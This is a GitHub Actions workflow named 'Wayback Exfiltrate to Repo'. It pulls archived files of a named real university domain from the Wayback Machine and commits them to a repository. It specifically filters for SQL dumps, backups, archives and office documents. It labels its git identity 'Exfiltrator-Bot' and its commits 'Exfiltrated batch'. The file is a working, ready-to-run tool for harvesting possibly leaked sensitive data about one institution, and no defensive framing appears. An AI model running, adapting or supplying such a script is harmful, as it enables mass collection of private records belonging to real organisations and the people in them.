name: Wayback Exfiltrate to Repo
on:
  workflow_dispatch: # Manual trigger

jobs:
  download-and-upload:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Checkout Repo
        uses: actions/checkout@v3

      - name: Setup Environment
        run: |
          sudo apt-get install -y curl grep
          mkdir -p oversized_files

      - name: Get Archive File List
        run: |
          # Fetching a wide variety of document and backup extensions
          DOMAIN="alagappauniversity.ac.in"
          curl -s "https://web.archive.org/cdx/search/cdx?url=$DOMAIN/*&output=text&fl=original&collapse=urlkey" | \
          grep -E "\.pdf|\.docx|\.xlsx|\.zip|\.rar|\.sql|\.bak|\.7z|\.doc|\.xls" > file_list.txt
          echo "Found $(wc -l < file_list.txt) files to process."

      - name: Process and Upload in Batches
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          git config --global user.name "Exfiltrator-Bot"
          git config --global user.email "bot@ops.local"
          
          count=0
          batch_size=50

          while read -r original_url; do
            # 1. Construct Wayback URL (direct download link)
            wayback_url="https://web.archive.org/web/20260000000000if_/$original_url"
            
            # 2. Determine local path (Site Name -> Original Path)
            clean_path=$(echo "$original_url" | sed 's|https\?://||g')
            dir_path="alagappauniversity.ac.in/$(dirname "$clean_path")"
            file_name=$(basename "$original_url")
            
            # 3. Download to temp to check size
            mkdir -p "$dir_path"
            curl -L -s -o "temp_file" "$wayback_url"

            if [ -f "temp_file" ]; then
              filesize=$(stat -c%s "temp_file")
              
              # SIZE GUARD: Skip if > 90MB (GitHub limit is 100MB)
              if [ $filesize -gt 94371840 ]; then
                echo "[SIZE ALERT] Skipping $file_name ($(($filesize/1048576))MB)"
                echo "URL: $original_url | Size: $(($filesize/1048576))MB" >> oversized_files/skipped_links.txt
                rm temp_file
                continue
              fi

              # Skip tiny/empty files (likely errors)
              if [ $filesize -lt 100 ]; then
                rm temp_file
                continue
              fi

              # Move to final location
              mv temp_file "$dir_path/$file_name"
              ((count++))
              echo "Downloaded: $file_name"
            fi

            # 4. Batch Push Every 50 Files
            if [ $((count % batch_size)) -eq 0 ] && [ $count -ne 0 ]; then
              echo "Syncing batch to GitHub..."
              git add .
              git commit -m "Exfiltrated batch: $count files processed"
              git push https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git HEAD:${{ github.ref }}
            fi

          done < file_list.txt

          # Final Push for remaining files
          git add .
          git commit -m "Final batch completion" || echo "No remaining changes"
          git push https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git HEAD:${{ github.ref }}
